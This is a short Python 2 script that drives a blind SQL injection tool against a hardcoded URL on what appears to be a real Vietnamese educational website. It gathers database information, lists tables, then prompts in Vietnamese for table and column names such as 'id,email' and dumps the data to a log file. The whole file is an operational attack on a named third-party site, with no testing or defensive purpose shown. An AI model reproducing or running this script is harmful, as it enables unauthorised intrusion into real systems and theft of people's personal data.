from sqli import *
from sqli_quick_blind import *

## Setting
inject_link = 'http://edu.hiast.edu.vn/index.php?pg=tintuc&task=chitiet&p2=26&p3=4331 '
table_name = ''
column_name = ''

## Class
hdl = SQLI_Quick_Blind()
hdl.initialize()
hdl.setLink(inject_link)
hdl.getInfo()
hdl.getTable()
hdl.printInfo()
finished = False
while not finished:
    table_name = raw_input("Nhap table: ")
    if table_name != '':
        hdl.getColumn(table_name)
        print hdl.params['column']
        column_name = raw_input("Nhap danh sach cot, cach nhau dau ',' (vd: id,email) : ")
        if column_name != '':
            hdl.getData(column_name,table_name)
        print hdl.params['data']
    confirm = raw_input("Ban muon tiep tuc? Nhan y hoac Y: ")
    if confirm != 'Y' and confirm != 'y':
        finished = True
print "Open log.txt at the same folder for the detail"
hdl.releaseResource()